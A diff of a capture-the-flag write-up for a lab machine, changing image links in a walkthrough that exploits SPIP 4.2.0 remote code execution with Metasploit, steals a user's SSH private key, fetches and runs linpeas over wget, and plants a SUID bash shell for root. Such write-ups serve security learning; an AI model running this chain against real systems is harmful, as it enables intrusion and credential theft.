@@ -39,7 +39,7 @@ To find hidden files and directories, I used gobuster with a large wordlist (big
 gobuster dir -u http://10.10.176.47 -w /usr/share/seclists/Discovery/Web-Content/big.txt
 ```
 
-![](attachment/9c2b5709eb07a9f3508eb500de66d327.png)
+![publisher2](https://github.com/user-attachments/assets/81a1bed8-ff22-4a2c-a771-da91c749b366)
 
 This revealed the `/spip` directory, which had a 301 redirect. The 301 status indicated the resource was available but redirected, so I visited it directly to investigate further.
 
@@ -48,12 +48,13 @@ This revealed the `/spip` directory, which had a 301 redirect. The 301 status 
 **SPIP CMS Identification:**  
 After discovering the `/spip` directory, I Googled "SPIP" and found out it is a Content Management System (CMS). It's not as widely known, which made it a potential target for a vulnerability. I found out that SPIP often has an admin login panel at `/spip/ecrire`. This could be useful since I knew the challenge involved exploiting a vulnerability for remote code execution (RCE).
 
-![](attachment/a23ff84afca510d5e6d77b704218c5b3.png)
+![publisher3](https://github.com/user-attachments/assets/680d65c1-640e-4538-af81-2fcbf45e4f9a)
 
 **Accessing the Admin Panel:**  
 Visiting the URL `http://10.10.176.47/spip/ecrire` revealed a login page. I tried the default credentials (`admin:admin`) but was met with an incorrect password message. At this point, I shifted focus from the initial login attempt to explore vulnerabilities, specifically remote code execution, which was mentioned in the room description.
 
-![](attachment/f2b2c3320087535564607cec4acbb97e.png)
+![publisher4](https://github.com/user-attachments/assets/f7844dc6-328b-4207-bd94-396237ca9d81)
+
 ### Exploiting the SPIP RCE Vulnerability
 
 **Enumerating the SPIP Version:**  
@@ -65,7 +66,7 @@ curl -I http://10.10.176.47/spip/
 
 This returned information about the version, revealing that the target was running SPIP 4.2.0.
 
-![](attachment/414d5a44a1bbf67e309384949bbdf8a5.png)
+![publisher5](https://github.com/user-attachments/assets/0b28e1b5-0958-4c8a-928c-9c9abdd2e266)
 
 **Searching for Exploits:**  
 With the version in hand, I searched searchsploit for known vulnerabilities:
@@ -74,7 +75,7 @@ With the version in hand, I searched searchsploit for known vulnerabilities:
 searchsploit spip
 ```
 
-![](attachment/633239e4a12db24cbd735bd1562d5bc6.png)
+![publisher6](https://github.com/user-attachments/assets/c5f1afe8-bb52-411c-a052-20f5e49e028c)
 
 I discovered that SPIP 4.2.0 has an RCE vulnerability. At this point, I had everything needed to exploit it.
 
@@ -87,10 +88,9 @@ search spip
 use exploit/multi/http/spip_rce_form
 ```
 
-![](attachment/b1e7da17ea33d4c632b6d882696db771.png)
+![publisher7](https://github.com/user-attachments/assets/1395e7f1-aae9-4106-9723-1256f2622bfe)
 
-![](attachment/ce7ea9766a21fc13580c2aecb4d08495.png)
-
+![publisher8](https://github.com/user-attachments/assets/36b64f2c-eac8-40e4-b85e-9da86679497d)
 
 **Why Metasploit:**  
 Metasploit is an excellent tool for automating the exploitation of known vulnerabilities. It provides a ready-to-use exploit for the SPIP RCE vulnerability, which saved time compared to manually crafting an exploit.
@@ -107,7 +107,8 @@ exploit
 
 This successfully established a Meterpreter session, giving me shell access on the target machine.
 
-![](attachment/4f2e4fad83b6aea52db0845c335d4dcb.png)
+![publisher9](https://github.com/user-attachments/assets/0560f579-2ad6-48ef-a971-ef19be4fef1c)
+
 ### Gaining User Access (Think)
 
 **Enumerating the File System:**  
@@ -122,7 +123,8 @@ ls -la /home/think
 
 This revealed the `user.txt` file in `/home/think`, which I could read to obtain the user flag.
 
-![](attachment/d53e3d687a27ac238c290af21f141536.png)
+![publisher10](https://github.com/user-attachments/assets/e5786438-a0af-4f10-8c01-509ff15498e3)
+
 ### Privilege Escalation to Root
 
 **Listing System Users:**  
@@ -150,7 +152,7 @@ I needed to find directories that `think` had write access to, so I used `fin
 find / -writable -type d 2>/dev/null
 ```
 
-![](attachment/987a015232c2e37984ee5f5631e774ae.png)
+![publisher11](https://github.com/user-attachments/assets/ec205ad9-d012-495e-85a7-5b2aa59ecc5f)
 
 This returned a lot of results, but it was still too broad.
 
@@ -161,7 +163,7 @@ I found a `.ssh` directory in `/home/think`. This piqued my interest because 
 ls -la /home/think/.ssh
 ```
 
-![](attachment/7399e796710d2c79ae2c7e57d754dbe5.png)
+![publisher12](https://github.com/user-attachments/assets/8431416b-3298-4252-88aa-04f910d26879)
 
 Inside, I found the `id_rsa` private key.
 
@@ -172,7 +174,7 @@ I downloaded the `id_rsa` key to my local machine using Meterpreter's download
 download /home/think/.ssh/id_rsa
 ```
 
-![](attachment/f7d8b4ac2381cad180815ec045ba41d1.png)
+![publisher13](https://github.com/user-attachments/assets/dfc5dc6c-96b5-42f7-ba5a-49a85be11040)
 
 **Using SSH to Login as Think:**  
 After downloading the private key, I changed its permissions and used SSH to log in as `think`:
@@ -182,7 +184,7 @@ chmod 600 id_rsa
 ssh think@<ip> -i id_rsa
 ```
 
-![](attachment/02b61f521c70b7accf7d9ef2be91df8b.png)
+![publisher14](https://github.com/user-attachments/assets/83ab9430-dcaf-4359-9ec2-5e9e0043e342)
 
 **Why SSH and id_rsa:**  
 SSH keys are a secure way of logging into a machine, and I knew that `think` had an SSH key in the `.ssh` directory. By downloading the key and connecting via SSH, I bypassed the need for password-based login.
@@ -204,7 +206,7 @@ Then we can start a python server on the main machine and connect to it and down
 python -m http.server 80
 ```
 
-![](attachment/ee86055aa07290b03141883f2b44f640.png)
+![publisher15](https://github.com/user-attachments/assets/95d3a120-a6e1-4b7a-918c-3ed1bc225924)
 
 ```python
 wget http://<ip>/linpeas.sh
@@ -212,14 +214,14 @@ chmod 700 linpeas.sh
 ./linpeas.sh
 ```
 
-![](attachment/31defe7af1acfc9acf9d61a697fbfe36.png)
+![publisher16](https://github.com/user-attachments/assets/634a5859-83c8-4d57-b2c5-fac8ac0ac7bc)
 
-![](attachment/944c2c7937647445725f914ca5aaf7a4.png)
+![publisher17](https://github.com/user-attachments/assets/64813709-4963-4389-98b6-d3057eb13cda)
 
 **Identifying Privilege Escalation Path:**  
 linpeas flagged an unusual file in `/opt`—`run_container.sh`. I examined it, and using the information from linpeas, I copied `/bin/bash` into the `/run/user/1000` directory, edited `run_container.sh` to spawn a privileged shell, and executed it:
 
-![](attachment/9dcf72d135547b95d30b6ba8bfebb84e.png)
+![publisher18](https://github.com/user-attachments/assets/9cf5d429-1492-4dca-becb-d239a7ca540d)
 
 ```bash
 cp /bin/bash /run/user/1000
@@ -228,15 +230,14 @@ cd /opt
 nano run_container.sh
 ```
 
-![](attachment/f9c585cc209559d175a7fb03befa4ccd.png)
+![publisher19](https://github.com/user-attachments/assets/3434d28a-1141-4de9-a6b8-df02e8ced945)
 
-![](attachment/8d57dc076fbcda8121af46f408c71746.png)
-
+![publisher20](https://github.com/user-attachments/assets/8bcc77d8-b9f3-438c-a9a7-dad099f4e492)
 
 **Escalating to Root:**  
 Inside `run_container.sh`, I added a payload to create a root shell:
 
-![](attachment/ba52a9fee3fa864e07337649e0328200.png)
+![publisher21](https://github.com/user-attachments/assets/741ae5ef-44b2-4497-9d4e-e68282338d90)
 
 ```bash
 cp /bin/bash /tmp/bash
@@ -244,7 +245,7 @@ chmod +s /tmp/bash
 /tmp/bash -p
 ```
 
-![](attachment/eae05bb3be1aafae96815c0e772e237a.png)
+![publisher22](https://github.com/user-attachments/assets/44eebca9-52da-40ca-919e-80bf1ab883be)
 
 This gave me a root shell, and I was able to read the root flag:
 
@@ -253,7 +254,8 @@ cd /root
 cat root.txt
 ```
 
-![](attachment/a7a21ead0925526ea778b1e151cb4882.png)
+![publisher23](https://github.com/user-attachments/assets/5b79d411-ba8d-429f-ab62-dedddaae7588)
+
 ## 4. Takeaways 
 
 - **Metasploit:** Automating exploitation with Metasploit can save time, especially when known exploits are available for the target system.
